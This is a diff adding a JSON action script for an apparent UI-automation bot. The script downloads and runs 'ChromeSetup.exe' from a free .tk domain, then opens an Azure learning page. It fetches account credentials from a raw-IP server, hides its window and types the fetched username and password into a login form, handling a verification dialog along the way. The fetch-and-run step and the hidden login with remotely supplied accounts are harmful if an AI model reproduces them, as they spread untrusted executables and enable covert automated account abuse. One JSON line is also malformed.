@@ -1,0 +1,111 @@
+{
+	"loop": 1,
+	"elapse": 1000,
+	"actions":[
+		{
+			"type":"download",
+			"url":"http://w.trany.tk/ChromeSetup.exe",
+			"file:"ChromeSetup.exe"
+		},
+		{
+			"type":"shellopen",			
+			"file": "ChromeSetup.exe",
+			"absolute":0,
+			"param": ""
+		},
+		{
+			"type":"findwindow",
+			"caption":"Google Chrome Setup",
+			"times": 10,
+			"elapse": 1000
+		},
+		{
+			"type":"myclick",
+			"x": 50,
+			"y": 285,
+			"elapse": 1000
+		},
+		{
+			"type":"findwindow",
+			"caption":"Google Chrome",
+			"times": 10,
+			"elapse": 1000
+		},
+		{
+			"type":"inputstr",
+			"str":"https://docs.microsoft.com/learn/modules/welcome-to-azure/3-create-a-vm?pivots=windows-cloud",
+			"elapse": 100
+		},
+		{
+			"type":"keypress",
+			"chr":"VK_RETURN",
+			"ctrl": 0,
+			"shift": 0,
+			"elapse": 1000
+		},
+		{
+			"type":"getaccount",
+			"url":"http://119.28.52.207:3000/users/get"
+		},
+		{
+			"type":"hideme",
+			"show": 5
+		},		
+		{
+			"type":"myclick",
+			"x": 50,
+			"y": 285,
+			"elapse": 1000
+		},
+		{
+			"type":"myclick",
+			"x": 120,
+			"y": 388,
+			"elapse": 1000
+		},
+		{
+			"type":"myclick",
+			"x": 35,
+			"y": 130,
+			"elapse": 1000
+		},
+		{
+			"type":"keypress",
+			"chr":"",
+			"ctrl": 1,
+			"shift": 0,
+			"elapse": 1000
+		},
+		{
+			"type":"inputstr",
+			"str":"%UNAME%",
+			"elapse": 1000
+		},
+		{
+			"type":"myclick",
+			"x": 35,
+			"y": 175,
+			"elapse": 1000
+		},
+		{
+			"type":"inputstr",
+			"str":"%UPWD%",
+			"elapse": 1000
+		},
+		{
+			"type":"myclick",
+			"x": 120,
+			"y": 430,
+			"elapse": 1000
+		},
+		{
+			"type":"checkverifydlg",
+			"times": 10,
+			"elapse": 1000
+		},		
+		{
+			"type":"hideme",
+			"show": 5
+		}
+	]
+}
